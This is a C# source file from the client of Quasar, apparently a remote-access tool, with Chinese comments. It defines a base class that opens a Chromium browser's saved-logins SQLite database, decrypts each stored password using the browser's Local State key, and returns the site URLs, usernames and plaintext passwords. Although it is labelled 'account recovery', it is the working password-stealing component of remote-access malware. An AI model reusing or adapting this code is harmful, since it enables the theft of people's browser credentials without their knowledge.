using Quasar.Client.Recovery.Utilities;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
    /// <summary>
    /// 提供基于chromium应用程序的基本账户恢复功能。
    /// </summary>
    public abstract class ChromiumBase : IAccountReader
    {
        /// <inheritdoc />
        public abstract string ApplicationName { get; }

        /// <inheritdoc />
        public abstract IEnumerable<RecoveredAccount> ReadAccounts();

        /// <summary>
        /// 读取基于chromium应用程序的存储账户。
        /// </summary>
        /// <param name="filePath">登录数据库的文件路径。</param>
        /// <param name="localStatePath">本地状态的文件路径。</param>
        /// <returns>恢复账户的列表。</returns>
        protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
        {
            var result = new List<RecoveredAccount>();

            if (File.Exists(filePath))
            {
                SQLiteHandler sqlDatabase;

                if (!File.Exists(filePath))
                    return result;

                var decryptor = new ChromiumDecryptor(localStatePath);

                try
                {
                    sqlDatabase = new SQLiteHandler(filePath);
                }
                catch (Exception)
                {
                    return result;
                }

                if (!sqlDatabase.ReadTable("logins"))
                    return result;

                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var host = sqlDatabase.GetValue(i, "origin_url");
                        var user = sqlDatabase.GetValue(i, "username_value");
                        var pass = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));

                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                        {
                            result.Add(new RecoveredAccount
                            {
                                Url = host,
                                Username = user,
                                Password = pass,
                                Application = ApplicationName
                            });
                        }
                    }
                    catch (Exception)
                    {
                        // ignore invalid entry
                    }
                }
            }
            else
            {
                throw new FileNotFoundException("Can not find chromium logins file");
            }

            return result;
        }
    }
}
